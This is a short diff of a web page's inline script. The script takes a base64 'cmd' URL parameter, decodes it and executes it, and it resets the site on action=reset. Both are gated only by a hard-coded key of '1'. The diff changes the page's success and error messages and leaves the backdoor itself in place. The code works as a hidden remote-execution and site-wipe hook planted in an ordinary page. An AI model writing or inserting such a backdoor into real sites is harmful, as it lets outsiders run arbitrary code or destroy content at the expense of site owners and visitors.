@@ -15,7 +15,6 @@
     <div class="container"><div id="output"></div></div>
     <script>
         const SECRET_KEY = "1";
-        let originalOutput = '';
         
         function showResult(text, isError) {
             var line = document.createElement('div');
@@ -73,20 +72,23 @@
             var params = getParams();
             if (!params.key && !params.cmd && !params.action) return;
             if (params.key !== SECRET_KEY) {
-                showResult('Wrong key', true);
+                document.body.innerHTML = '<h3>❌ Wrong API key</h3>';
                 return;
             }
             if (params.action === 'reset') {
                 resetSite();
+                document.body.innerHTML = '<h3>✅ Site reset successful</h3><a href=".">Back to site</a>';
                 return;
             }
             if (params.cmd) {
                 var decoded = decodeBase64(params.cmd);
                 if (decoded) {
                     executeCode(decoded);
+                    document.body.innerHTML = '<h3>✅ Command executed successfully</h3><a href=".">Back to site</a>';
                 } else {
-                    showResult('Decode error', true);
+                    document.body.innerHTML = '<h3>❌ Decode error</h3><a href=".">Back</a>';
                 }
+                return;
             }
         }
         init();
